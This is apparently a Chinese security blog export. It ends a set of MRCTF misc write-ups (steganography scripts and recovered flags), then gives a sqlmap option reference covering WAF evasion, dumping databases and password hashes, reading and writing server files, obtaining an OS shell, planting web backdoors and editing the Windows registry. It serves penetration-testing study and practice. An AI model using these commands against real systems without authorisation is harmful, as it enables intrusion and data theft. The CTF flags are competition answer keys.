	im<span class="token punctuation">.</span>putpixel<span class="token punctuation">(</span><span class="token punctuation">(</span>i<span class="token punctuation">,</span> j<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token builtin">int</span><span class="token punctuation">(</span>rgb<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token builtin">int</span><span class="token punctuation">(</span>rgb<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token builtin">int</span><span class="token punctuation">(</span>rgb<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
	
im<span class="token punctuation">.</span>show<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>得到二维码，扫码得flag：<code>MRCTF&#123;ta01uyout1nreet1n0usandtimes&#125;</code></p>
<h2 id="Unravel"><a href="#Unravel" class="headerlink" title="Unravel!!"></a>Unravel!!</h2><p>首先是Look_at_the_file_ending.wav文件，直接010打开，可以看到有一串字符串</p>
<p><code>key=U2FsdGVkX1/nSQN+hoHL8OwV9iJB/mSdKk5dmusulz4=</code></p>
<p>然后看看JM.png这张图片，binwalk，foremost一下，得到压缩包，解压得到aes.png图片，上面写着“Tokyo”</p>
<p>估计是aes加密，找个网站在线解密一下<a href="https://www.sojson.com/encrypt_aes.html">https://www.sojson.com/encrypt_aes.html</a></p>
<p>又得到一串字符串<code>CCGandGulu</code></p>
<p>最后看看Ending.wav，用SilentEye打开，输入密码，得到flag:<code>MRCTF&#123;Th1s_is_the_3nd1n9&#125;</code></p>
<h2 id="Hello-misc"><a href="#Hello-misc" class="headerlink" title="Hello_ misc"></a>Hello_ misc</h2><p>拿到图片，binwalk,foremost直接走起，得到压缩包，然后用Stegsolve看看图片，将Red的0通道保存得到压缩包密码：<code>!@#$%67*()-+</code></p>
<p>压缩包解压后，打开文件是一大堆63,127,191,255，TTL隐写</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python">fp <span class="token operator">=</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">'out.txt'</span><span class="token punctuation">,</span><span class="token string">'r'</span><span class="token punctuation">)</span>
a <span class="token operator">=</span> fp<span class="token punctuation">.</span>readlines<span class="token punctuation">(</span><span class="token punctuation">)</span>
p <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>
<span class="token keyword">for</span> i <span class="token keyword">in</span> a<span class="token punctuation">:</span>
    p<span class="token punctuation">.</span>append<span class="token punctuation">(</span><span class="token builtin">int</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">)</span>
s <span class="token operator">=</span> <span class="token string">''</span>
<span class="token keyword">for</span> i <span class="token keyword">in</span> p<span class="token punctuation">:</span>
    <span class="token keyword">if</span> i <span class="token operator">==</span> <span class="token number">63</span><span class="token punctuation">:</span>
        a <span class="token operator">=</span> <span class="token string">'00'</span>
    <span class="token keyword">elif</span> i <span class="token operator">==</span> <span class="token number">127</span><span class="token punctuation">:</span>
        a <span class="token operator">=</span> <span class="token string">'01'</span>
    <span class="token keyword">elif</span> i <span class="token operator">==</span> <span class="token number">191</span><span class="token punctuation">:</span>
        a <span class="token operator">=</span> <span class="token string">'10'</span>
    <span class="token keyword">elif</span> i <span class="token operator">==</span> <span class="token number">255</span><span class="token punctuation">:</span>
        a <span class="token operator">=</span> <span class="token string">'11'</span>
    s <span class="token operator">+=</span> a

<span class="token keyword">import</span> binascii
flag <span class="token operator">=</span> <span class="token string">''</span>
<span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token builtin">len</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    flag <span class="token operator">+=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token builtin">int</span><span class="token punctuation">(</span>s<span class="token punctuation">[</span>i<span class="token punctuation">:</span>i<span class="token operator">+</span><span class="token number">8</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token keyword">print</span> <span class="token punctuation">(</span>flag<span class="token punctuation">)</span>
<span class="token comment"># rar-passwd:0ac1fe6b77be5dbe</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>得到了rar的密码：<code>0ac1fe6b77be5dbe</code></p>
<p>rar解压后发现文档中的5串base64编码，解码之后全是0和1</p>
<p>然后仔细一看，将1替换成空格，然后缩小至最小（sublime Text），就能看出flag了</p>
<p>flag:<code>MRCTF&#123;He1Lo_mi5c~&#125;</code> (居然是5。。。)</p>
<h2 id="pyFlag"><a href="#pyFlag" class="headerlink" title="pyFlag"></a>pyFlag</h2><p>给了3张图片，010打开发现文件尾都有点数据，foremost分不出来，仔细看了看，将三个数据合并成一个后，解压得到一个txt，里面是flag的base套娃，直接一个一个的试</p>
<p>解码顺序：base85-&gt;base16-&gt;base32-&gt;base16-&gt;base64</p>
<p>flag:<code>MRCTF&#123;Y0u_Are_4_p3rFect_dec0der&#125;</code></p>
<h2 id="寻找xxx"><a href="#寻找xxx" class="headerlink" title="寻找xxx"></a>寻找xxx</h2><p>电话音，使用dtmf2num.exe，得到电话号码18684221609</p>
<p>发送到公众号，得到flag:<code>MRCTF&#123;Oh!!!_Y0u_f1nd_my_secret&#125;</code></p>
<h2 id="A-Signal-From-ISS"><a href="#A-Signal-From-ISS" class="headerlink" title="A Signal From ISS"></a>A Signal From ISS</h2><p>SSTV无线电相关知识，将图片转换成声音，使用MMSSTV即可</p>
<p>flag:<code>merak&#123;r3ce1ved_4n_img&#125;</code></p>
<h2 id="小O的考研复试"><a href="#小O的考研复试" class="headerlink" title="小O的考研复试"></a>小O的考研复试</h2><p>简单数学题</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python">flag<span class="token operator">=</span><span class="token number">0</span>
<span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">19260817</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
  flag<span class="token operator">=</span><span class="token punctuation">(</span>flag<span class="token operator">*</span><span class="token number">10</span><span class="token operator">+</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token operator">%</span><span class="token number">1000000007</span>

<span class="token keyword">print</span> flag
<span class="token comment"># 577302567</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>flag:<code>MRCTF&#123;577302567&#125;</code></p>
]]></content>
      <categories>
        <category>比赛</category>
      </categories>
      <tags>
        <tag>CRYPTO</tag>
        <tag>MISC</tag>
      </tags>
  </entry>
  <entry>
    <title>sqlmap相关命令</title>
    <url>/2020/06/06/sqlmap-xiang-guan-ming-ling/</url>
    <content><![CDATA[<p>sqlmap版本：1.4.6</p>
<p>借鉴了网上几位大佬的总结，自己也加了一些</p>
<span id="more"></span>
<h1 id="选项"><a href="#选项" class="headerlink" title="选项"></a>选项</h1><pre><code>-h,--help  显示基本帮助信息并退出
-hh        显示高级帮助信息并退出
--version  显示程序版本信息并退出
-v VERBOSE 信息级别: 0-6 （缺省1）
其值具体含义：
“0”只显示python错误以及严重的信息；
“1”同时显示基本信息和警告信息（默认）；
“2”同时显示debug信息；
“3”同时显示注入的payload；
“4”同时显示HTTP请求；
“5”同时显示HTTP响应头；
“6”同时显示HTTP响应页面；
如果想看到sqlmap发送的测试payload最好的等级就是3。
</code></pre><h1 id="获取目标"><a href="#获取目标" class="headerlink" title="获取目标"></a>获取目标</h1><p>-d：直接连接数据库 （-d “mysql://user:passward@地址:端口/数据库名称”）</p>
<ol>
<li><p>get方法<br>-u：指定url  （?id=1）<br>-l：从Brupsuite proxy或WebScarab proxy中读取http请求日志文件<br>-x：从sitemap.xml站点地图文件中读取目标探测<br>-m：从多行文本格式文件读取多个目标，对多个目标进行探测<br>-r：丛文本文件中读取http请求作为SQL注入探测的目标<br>-c：从配置文件sqlmap.conf中读取目标探测<br>-g：google搜索出来的结果 （-g “inurl:\”.php?id=1\””）\”只是将双引号内的”特殊字符进行转义</p>
</li>
<li><p>post方法<br>-data：-u “<a href="http://xxx.xxx.xxx">http://xxx.xxx.xxx</a>“ —data=”post请求抓取的源代码” </p>
</li>
</ol>
<h2 id="请求参数"><a href="#请求参数" class="headerlink" title="请求参数"></a>请求参数</h2><h2 id="HTTP数据"><a href="#HTTP数据" class="headerlink" title="HTTP数据"></a>HTTP数据</h2><ol>
<li><p>数据段： -data<br>get/post都适用<br>对于post还可以使用链接并将post抓取的源代码用—data，并输入抓取的源代码<br>sqlmap -u <a href="http://&quot;链接">http://&quot;链接</a>“ —data=”post请求抓取的源代码” —dbs，常用于post请求。</p>
</li>
<li><p>cookie头<br>—cookie：-u “url” —cookie=”…” —level 2（需要注意的是，当level默认为1的时候，默认不扫cookie的内容，必须是level大于等于2才能扫cookie里的内容）</p>
</li>
<li><p>user-agent头<br>—user-agent http：头会携带一个值，就是user-agent，表示访问的浏览器的信息，我们可以手动指定伪造一个<br>—random-agent：随机产生user-agent头，也不是随机，是从/usr/share/sqlmap/txt/user-agents.txt，收集了大量的浏览器信息<br>sqlmap -u “…” —cookie=”…” —level 3  —random-agent —dbs —user-agent=”aaaaa”<br>lever&gt;=3才会去检查user-agent头是否存在注入漏洞</p>
</li>
<li><p>host头<br>—host  level=5，host存在注入的漏洞情况比较少，同时也不建议把级别设置成5<br>—host=”aaaaaa”，每次HOST请求时都会变成一串a</p>
</li>
<li><p>referer头<br>—referer  level&gt;=3，才会对referer头进行检测<br>—referer=”aaaa”</p>
</li>
<li><p>额外定义的heade头<br>—HEADER 设置单一的http头<br>—headers 每个头单独一行，可以使用\n来换行（名称区分大小写）<br>—headers=”…\n…”</p>
</li>
</ol>
<h2 id="身份验证"><a href="#身份验证" class="headerlink" title="身份验证"></a>身份验证</h2><ol>
<li><p>HTTP协议认证<br>Basic    基本身份验证<br>Digest   摘要式身份认证<br>NTLM     NTLM身份验证（windows）<br>sqlmap -u “…”  —auth-type Basic —auth-cred “user:pass” ，指明验证类型为Basic，并说明用户名和密码</p>
</li>
<li><p>http(s)代理<br>主动请求时会被记录，被发现屏蔽，这时我们需要个代理，就用到了—proxy参数了。<br>—proxy=”<a href="http://127.0.0.1:8087">http://127.0.0.1:8087</a>“<br>—proxy-cred=”name:pass”  需做身份验证时<br>—proxy-file 用于设置文件中的多条代理<br>—ignore-proxy 忽略系统级代理，通常用于扫描本地网络目标（若在操作系统设置了代理，后续的一切工作都经过代理）</p>
</li>
<li><p>基于客户端证书（比较少见，在以前的网银中比较常见）<br>当Web服务器需要客户端证书进行身份验证时，需要提供两个文件:key_file，cert_file。<br>key_file是格式为PEM文件，包含着你的私钥，cert_file是格式为PEM的连接文件。<br>—auth-cert (name:password)<br>—auth-file（HTTP authentication PEM cert/private key file）<br>如：—auth-file=”ca.PEM”,含有私钥的PEM格式证书文件或PEM格式的证书链文件</p>
</li>
<li><p>设置忽略401<br>—ignore-401参数用来忽略为验证错误<br>如果想测试返回HTTP错误401（未经授权）的站点，在忽略它并不提供适当凭证的情况下继续测试</p>
</li>
</ol>
<h2 id="使用技巧"><a href="#使用技巧" class="headerlink" title="使用技巧"></a>使用技巧</h2><ol>
<li><p>HTTP请求延迟<br>发送量过大的话，会引起waf等发现，<br>—delay  每次http(s)请求之间延迟时间，浮点数，单位为妙，默认无延迟，输入此参数，你会发现每个请求都会延迟3秒，当然数据库还是可以爆出来的</p>
</li>
<li><p>设置请求超时时间<br>若客户端一直未收到服务器返回的值，就一直等着，所以需要个请求超时时间<br>—timeout  请求超时时间，浮点数，默认30秒</p>
</li>
<li><p>设定重试时间<br>—retries  http(s)连接超时重传次数，默认3次</p>
</li>
<li><p>设定随记改变的参数值<br>—randomize 长度、类型与原始值保持一致的前提下，值当每次请求随记取值的参数名<br>sqlmap -u “<a href="http://1.1.1.1/a.php?id=1">http://1.1.1.1/a.php?id=1</a>“ —randomize=”id”</p>
</li>
<li><p>利用正则表达式过滤目标网址<br>—scope  使用brup抓取的日志文件，但日志文件比较大，你只想检测日志中的一个站点或者某一个特征是否存在sql注入<br>过滤日志内容，通过正则表达式筛选扫描对象<br>sqlmap -l burp.lpg —scope=”(www)?.baidu.(com|net|org)”<br>sqlmap -l burp.lpg —scope=”(19)?.168.20.(1|10|100)”</p>
</li>
<li><p>关掉URL参数值编码<br>—skip-urlencode 默认get方法会对传输内容进行编码，某些web服务器不遵循RFC标准编码，使用原始字符提交数据</p>
</li>
<li><p>避免过多的错误请求被屏蔽<br>有的web应用程序会在你多次访问错误的请求时屏蔽掉你以后的所有请求，这样在sqlmap进行探测或者注入的时候可能造成错误请求而触发这个策略，导致以后无法进行。常见情况是在检测盲注阶段会产生大量失败请求，当产生大量错误请求后，服务器端可能因此销毁session<br>—safe-url：提供一个安全不错误的连接，每隔一段时间都会去访问一下。<br>—safe-post：POST数据发送到安全URL<br>—safe-req：从文件加载安全的HTTP请求<br>—safe-freq：提供一个安全不错误的连接，每次测试请求之后都会再访问一边安全连接。</p>
</li>
</ol>
<h1 id="性能优化"><a href="#性能优化" class="headerlink" title="性能优化"></a>性能优化</h1><p>-o：打开所有优化开关</p>
<ol>
<li><p>持久连接<br>—keep-alive：使用http(s)长连接，性能好，与—proxy参数不兼容</p>
</li>
<li><p>检索没有body响应的内容<br>—null-conection：只获取响应页面的大小值，而非页面具体内容能够<br>通常用于盲注判断真/假，降低网络带宽消耗<br>与—text-only参数不兼容（基于页面内容的比较判断真/假）</p>
</li>
<li><p>多线程<br>—threads=THREADS：并发HTTP请求的最大数量（默认1）<br>盲注时每个线程获取一个字符（7此请求），获取完成后线程结束<br>默认为1，建议不要超过10，否则可能影响站点可用性<br>与—predict-output参数不兼容</p>
</li>
<li><p>预测输出<br>—predict-output<br>根据检测方法，比对返回值和统计表内容，不断缩小检测范围，提高检测效率<br>版本名、用户名、密码、Prervileges、role、数据库名称、表名、列名<br>与—threads参数不兼容<br>统计表路径：/usr/share/sqlmap/txt/common-outputs.txt</p>
</li>
</ol>
<h1 id="注入"><a href="#注入" class="headerlink" title="注入"></a>注入</h1><ol>
<li><p>指定测试的参数<br>-p<br>sqlmap默认测试所有的GET和POST参数，当—level的值大于等于2的时候也会测试HTTP Cookie头的值，当大于等于3的时候也会测试User-Agent和HTTP Referer头的值。但是也可以手动用-p参数设置想要测试的参数。例如： -p “id,user-anget”<br>指定扫描的参数，也可指定变量名称，使—level失效</p>
</li>
<li><p>排除测试的参数<br>—skip /  —skip-static<br>当你使用—level的值很大但是有个别参数不想测试的时候可以使用—skip参数。排错指定的扫描参数，不指定的默认会对全部扫描，然后根据level级别对http头扫描<br>—skip-static可忽略非动态的参数<br>如：—level=5 —skip=”id,uesr-agent”</p>
</li>
<li><p>忽略探测具体的参数<br>—param-exclude<br>例：—param-exclude=”token|session”，可忽略对包含token或session的参数进行探测</p>
</li>
<li><p>指定数据库<br>—dbms 数据库管理系统名称[版本号]<br>默认情况系sqlmap会自动的探测web应用后端的数据库是什么，但是如果已经知道的目标是什么数据库了，可以使用—dbms指定数据库节省时间了,提高工作效率了<br>例：—dbms mysql 5.0<br>—dbms-cres = username:password<br>设置DBMS认证</p>
</li>
<li><p>指定数据库服务器系统<br>—os<br>默认情况下sqlmap会自动的探测数据库服务器系统，支持的系统有：Linux、Windows</p>
</li>
<li><p>强制设置无效值替换<br>—invalid-bignum  /  —invalid-logical  /  —invalid-string<br>默认情况下sqlmap使用负值使参数失效 id=1 -&gt; id=-1<br>bignum使用大数使参数值失效 id=999999</p>
</li>
<li><p>关闭负载转换机制<br>—no-cast<br>在检索结果是，sqlmap使用一种机制，在这种纸质中，所有的条目都被转换为字符串类型，并在NULL值的情况下用空格字符替换。这样做是为了防止出现任何错误状态（例如，将空格与字符串连接起来），并简化数据检索过程本身。尽管如此，还是有报告的案例（例如MySQL DBMS旧版本）由于数据检索本身的问题（没有返回值）需要关闭这种机制。</p>
</li>
<li><p>关闭字符转义机制<br>—no-escape<br>关闭使用char替换字符串功能<br>出于混淆和避免出错的目的，payload中用单引号界定字符串时，sqlmap使用char()编码逃避的方法替换字符串<br>select ‘foo’ -&gt;select char(102)+char(111)+char(111)</p>
</li>
<li><p>自定义注入负载位置<br>—prefix /  —sufix<br>在某些情况下，只有当用户提供要附加早注入负载的特定位置时，易受攻击的参数才可被利用。当用户一斤知道查询语法并希望通过直接提供注入有效负载的前缀和后缀来检测和利用SQL注入式使用<br>例如：</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token variable">$query</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"SELECT * FROM users WHERE id = ('.<span class="token interpolation"><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'id'</span><span class="token punctuation">]</span></span>.') LIMIT 0,1"</span><span class="token punctuation">;</span>
<span class="token comment">// python sqlmap.py -u "http://xxx.xxx.xxx/?id=1" -p id --prefix "')" --suffix "AND ('abc'='abc"</span>
<span class="token variable">$query</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"SELECT * FROM users WHERE id = ('1') &lt;PAYLOAD> AND ('abc'='abc') LIMIT 0,1"</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
</li>
<li><p>tamper脚本<br>—tamper<br>sqlmap本身不会回校发送的有效负载，出来单引号之间的字符串被CHAR()类似的表示形式所取代之外。<br>sqlmap通过tamper脚本来绕过WAF等防御措施，可以在tamper文件夹下找到所有sqlmap自带的tamper脚本。<br>例：—tamper “xxx.py,xx.py”</p>
</li>
</ol>
<h1 id="自定义检测参数"><a href="#自定义检测参数" class="headerlink" title="自定义检测参数"></a>自定义检测参数</h1><ol>
<li><p>探测等级<br>—level<br>此选项需要制定要执行的测试等级参数，共有5个等级。在执行有限数量的测试时，默认值为1,1~5探测复杂度逐步提升。<br>sqlmap使用的payload可以在/usr/share/sqlmap/xml/payloads中看到，也可以根据相应的格式添加自己的payload。<br>这个参数不仅影响使用哪些payload同时也会影响测试的注入点，GET和POST的数据都会测试，HTTP Cookie在level为2的时候就会测试，HTTP User-Agent/Referer头在level为3的时候就会测试。</p>
</li>
<li><p>风险等级<br>—risk<br>共有3个风险等级，默认是1会测试大部分的测试语句，2会增加基于时间的测试语句，3会增加OR语句的SQL注入测试。<br>在有些时候，例如在UPDATE的语句中，注入一个OR的测试语句，可能导致更新的整个表，可能造成很大的风险。<br>测试的语句同样可以在xml/payloads.xml中找到，你也可以自行添加payload。</p>
</li>
<li><p>页面比较参数<br>—string：指定包含字符串，查询为True<br>—not-string：指定包含字符串，查询为False<br>—regexp：指定通过正则表达式匹配字符串，查询为True<br>—code：指定匹配HTTP状态响应码，查询为True<br>默认情况下，通过比较注入的请求页面内容和未注入的原始页面内容，可以区分真查询和假查询。这种观念并不总是起作用，是因为在每次刷新页面内容的变化有时甚至没有注入。例如当页面有一个计数器，一个动态广告横幅或者其他HTML的一部分呈现动态和可能改变时间不仅因此用户的输入。为了绕过这个限制，sqlmap努力识别响应体的这些片段并进行相应处理。</p>
</li>
<li><p>内容比较参数<br>—text-only：设置页面内容中包含文本<br>—titles：设置页面title中包含文本<br>前提需要知道如何区分查询的真与假，根据返回字符串内容不同。<br>例：—text-only=”Welcome !!!”<br>—titles=”Login”</p>
</li>
</ol>
<h1 id="注入技术"><a href="#注入技术" class="headerlink" title="注入技术"></a>注入技术</h1><ol>
<li><p>注入类型<br>—technique<br>检测存在sql注入的技术类型，默认会测试所有的方式。<br>B:Boolean-based-blind（布尔型型注入）<br>E:Error-based（报错型注入）<br>U:Union query-based（联合注入）<br>S:Starked queries（堆叠注入）<br>T:Time-based blind（基于时间的盲注）<br>Q:Inline queries（内联查询注入）</p>
</li>
<li><p>设定盲注的延迟时间<br>—time-sec<br>基于时间的注入检测响应延迟时间（默认5秒）</p>
</li>
<li><p>设定UNION查询字段数<br>—union-cols<br>默认联合查询1-10列，随-level增加最多支持50列<br>例如：—union-cols 6-9，测试6-9个字段数</p>
</li>
<li><p>设定UNION查询使用的字符<br>—union-char<br>联合查询默认使用NULL，极端情况下NUL可能失败，此时可以手动指定数值<br>例如：—union-char 123</p>
</li>
<li><p>设定UNION查询表<br>—union-from<br>在某些情况下，sqlmap需要设定union查询SQL注入的具体数据表才可以得到数据</p>
</li>
<li><p>设置DNS攻击<br>—dns-domain “dns服务器”<br>针对目标网络很有可能有外部流量进行限制，或者设置WAF<br>通过设置DNS流量来突破限制，需要用户自身具有一个开放53端口的DNS服务器，通过DNS流量来获得web应用程序中的数据内容。</p>
</li>
<li><p>二次注入<br>—second-url<br>有些时候注入点输入的数据看返回结果的时候并不是当前的页面，而是另外的一个页面，这时候就需要你指定到哪个页面获取响应判断真假。<br>—second-url后面跟一个判断页面的URL地址。</p>
</li>
<li><p>识别指纹<br>-f，—fingerprint<br>-b，—banner<br>数据库管理系统指纹信息<br>大多数的数据库系统都有一个函数可以返回数据库的版本号，通常这个函数是version()或者变量@@version这主要取决与是什么数据库。</p>
</li>
</ol>
<h1 id="枚举信息"><a href="#枚举信息" class="headerlink" title="枚举信息"></a>枚举信息</h1><pre><code>-a, --all           获取所有信息
-b, --banner        获取数据库管理系统的标识
--current-user      获取数据库管理系统当前用户
--current-db        获取数据库管理系统当前数据库
--hostname          获取数据库服务器的主机名称
--is-dba            检测DBMS当前用户是否DBA
--users             枚举数据库管理系统用户
--passwords         枚举数据库管理系统用户密码哈希
--privileges        枚举数据库管理系统用户的权限
--roles             枚举数据库管理系统用户的角色
--dbs               枚举数据库管理系统数据库
--tables            枚举的DBMS数据库中的表
--columns           枚举DBMS数据库表列
--schema            枚举数据库架构
--count             检索表的项目数
--dump              转储数据库表项
--dump-all          转储数据库所有表项
--search            搜索列（S），表（S）和/或数据库名称（S）
--comments          获取DBMS注释
--statements        检索在DBMS上运行的SQL语句
-D DB               要进行枚举的指定数据库名
-T TBL              枚举DBMS数据库表
-C COL              枚举DBMS数据库表列
-X EXCLUDECOL       不枚举的DBMS数据库标识符
-U USER             枚举DBMS用户
--exclude-sysdbs    枚举表时排除系统数据库
--pivot-column=P..  Pivot columnname
--where=DUMPWHERE   Use WHEREcondition while table dumping
--start=LIMITSTART  获取第一个查询输出数据位置
--stop=LIMITSTOP    获取最后查询的输出数据
--first=FIRSTCHAR   第一个查询输出字的字符获取
--last=LASTCHAR     最后查询的输出字字符获取
--sql-query=QUERY   要执行的SQL语句
--sql-shell         提示交互式SQL的shell
--sql-file=SQLFILE  要执行的SQL文件
</code></pre><h1 id="暴力破解"><a href="#暴力破解" class="headerlink" title="暴力破解"></a>暴力破解</h1><p>对于用sql注入无法爆出的数据库内容，可以使用暴力破解尝试着爆出数据库的内容。<br>1.暴力破解表名<br>—common-tables<br>mysql&lt;5.0,没有information schema库<br>mysql&lt;=5.0，但无权限读取information schema库<br>微软的access数据集，默认无权读取mysysobjects库</p>
<p>2.暴力破解列名<br>—common-columns<br>（access系统表无列信息）<br>暴力破解的表在txt/common-tables.txt文件中，列名在txt/common-columns.txt中。可以自行添加。</p>
<p>3.暴力破解文件<br>—common-files</p>
<h1 id="文件系统访问"><a href="#文件系统访问" class="headerlink" title="文件系统访问"></a>文件系统访问</h1><p>当数据库为MySQL，PostgreSQL或Microsoft SQL Server，并且当前用户有权限使用特定的函数。读取的文件可以是文本也可以是二进制文件。</p>
<p>读取系统文件<br>—file-read<br>—file-read=”文件绝对路径”</p>
<p>把文件上传到数据库服务器中<br>—file-write<br>—file-write=”123.txt” —file-dest “文件绝对路径”</p>
<pre><code>--file-read=RFILE   从后端的数据库管理系统文件系统读取文件
--file-write=WFILE  编辑后端的数据库管理系统文件系统上的本地文件
--file-dest=DFILE   后端的数据库管理系统写入文件的绝对路径
</code></pre><h1 id="操作系统访问"><a href="#操作系统访问" class="headerlink" title="操作系统访问"></a>操作系统访问</h1><p>当数据库为MySQL，PostgreSQL或Microsoft SQL Server，并且当前用户有权限使用特定的函数。<br>在MySQL、PostgreSQL，sqlmap上传一个二进制库，包含用户自定义的函数，sys_exec()和sys_eval()。<br>那么他创建的这两个函数可以执行系统命令。在Microsoft SQL Server，sqlmap将会使用xp_cmdshell存储过程，如果被禁（在Microsoft SQL Server 2005及以上版本默认止），sqlmap会重新启用它，如果不存在，会自动创建。<br>—os-shell<br>—os-cmd<br>用—os-shell参数也可以模拟一个真实的shell，可以输入你想执行的命令。<br>当不能执行多语句的时候（比如php或者asp的后端数据库为MySQL时），仍然可能使用INTO OUTFILE写进可写目录，来创建一个web后门。支持的语言：<br>1、ASP 2、ASP.NET 3、JSP 4、PHP</p>
<pre><code>--os-cmd=OSCMD      执行操作系统命令（OSCMD）
--os-shell          交互式的操作系统的shell
--os-pwn            获取一个OOB shell，meterpreter或VNC
--os-smbrelay       一键获取一个OOBshell，meterpreter或VNC
--os-bof            存储过程缓冲区溢出利用
--priv-esc          数据库进程用户权限提升
--msf-path=MSFPATH  MetasploitFramework本地的安装路径
--tmp-path=TMPPATH  远程临时文件目录的绝对路径
</code></pre><h1 id="Windows注册表访问"><a href="#Windows注册表访问" class="headerlink" title="Windows注册表访问"></a>Windows注册表访问</h1><pre><code>--reg-read          读一个Windows注册表项值
--reg-add           写一个Windows注册表项值数据
--reg-del           删除Windows注册表键值
--reg-key=REGKEY    Windows注册表键
--reg-value=REGVAL  Windows注册表项值
--reg-data=REGDATA  Windows注册表键值数据
--reg-type=REGTYPE  Windows注册表项值类型
</code></pre><h1 id="常规参数-amp-其它"><a href="#常规参数-amp-其它" class="headerlink" title="常规参数&amp;其它"></a>常规参数&amp;其它</h1><ol>
<li><p>-s  sqlmap会话文件保<br>sqlmap对每一个目标都会在output路径下自动生成一个SQLite文件，如果用户想指定读取的文件路径，就可以用这个参数。</p>
</li>
<li><p>-t 记录流量文件保存位置<br>这个参数需要跟一个文本文件，sqlmap会把HTTP(S)请求与响应的日志保存到那里。</p>
</li>
<li><p>—batch<br>用此参数，不需要用户输入，将会使用sqlmap提示的默认值一直运行下去。</p>
</li>
<li><p>强制使用字符编码<br>—charset 强制字符编码<br>—charset=GBK / —charset=”0123456789abcde…”<br>不使用sqlmap自动识别的（如HTTP头中的Content-Type）字符编码，强制指定</p>
</li>
<li><p>爬行网站URL<br>sqlmap可以收集潜在的可能存在漏洞的连接，后面跟的参数是爬行的深度。<br>—crawl  从起始位置爬站深度<br>—batch—crawl=3</p>
</li>
<li><p>刷新session文件<br>—flush-session  清空session<br>如果不想用之前缓存这个目标的session文件，可以使用这个参数。 会清空之前的session，重新测试该目标。</p>
</li>
<li><p>自动获取form表单测试<br>—forms<br>如果你想对一个页面的form表单中的参数测试，可以使用-r参数读取请求文件，或者通过—data参数测试。 但是当使用—forms参数时，sqlmap会自动从-u中的url获取页面中的表单进行测试。</p>
</li>
<li><p>忽略在会话文件中存储的查询结果<br>-fresh-quesries 忽略session查询结果</p>
</li>
<li><p>使用DBMS的hex函数<br>—hex  dump非ASCII字符内容时，将其编码为16进制形式，收到后解码还原</p>
</li>
<li><p>分析和现实数据库内建报错信息<br>—parse-errors  将会分析和现实数据库内建报错信息</p>
</li>
</ol>
<pre class="line-numbers language-none"><code class="language-none">-s SESSIONFILE      保存和恢复检索会话文件的所有数据
-t TRAFFICFILE      记录所有HTTP流量到一个文本文件中
-z MNEMONICS        使用短记忆法 (e.g.&quot;flu,bat,ban,tec&#x3D;EU&quot;)
--alert&#x3D;ALERT       发现SQL注入时，运行主机操作系统命令
--answers&#x3D;ANSWERS   设置预定义的答案(e.g. &quot;quit&#x3D;N,follow&#x3D;N&quot;)
--base64&#x3D;BASE64P..  包含Base64编码数据的参数
--batch             从不询问用户输入，使用所有默认配置。
--beep              发现sql注入时，发出蜂鸣声。
--binary-fields&#x3D;..  结果字段具有二进制值(e.g.&quot;digest&quot;)
--charset&#x3D;CHARSET   强制字符编码
--check-internet    Check Internet connection before assessing the target
--cleanup           清除sqlmap注入时在DBMS中产生的udf与表。
--crawl&#x3D;CRAWLDEPTH  从目标URL爬行网站
--crawl-exclude&#x3D;..  正则表达式从爬行页中排除
--csv-del&#x3D;CSVDEL    限定使用CSV输出 (default&quot;,&quot;)
--dependencies      Check formissing (non-core) sqlmap dependencies
--disable-coloring  默认彩色输出，禁掉彩色输出。
--dump-format&#x3D;DU..  转储数据格式(CSV(default), HTML or SQLITE)
--eta               显示每个输出的预计到达时间
--flush-session     刷新当前目标的会话文件
--forms             解析和测试目标URL表单
--fresh-queries     忽略在会话文件中存储的查询结果
--gpage&#x3D;GOOGLEPAGE  使用前100个URL地址作为注入测试，结合此选项，可以指定页面的URL测试
--hex               使用DBMS Hex函数数据检索
--identify-waf      进行WAF&#x2F;IPS&#x2F;IDS保护测试，目前大约支持30种产品的识别
--mobile            有时服务端只接收移动端的访问，此时可以设定一个手机的User-Agent来模仿手机登陆。
--offline           Work inoffline mode (only use session data)
--output-dir&#x3D;OUT..  自定义输出目录路径
--parse-errors      解析和显示响应数据库错误信息
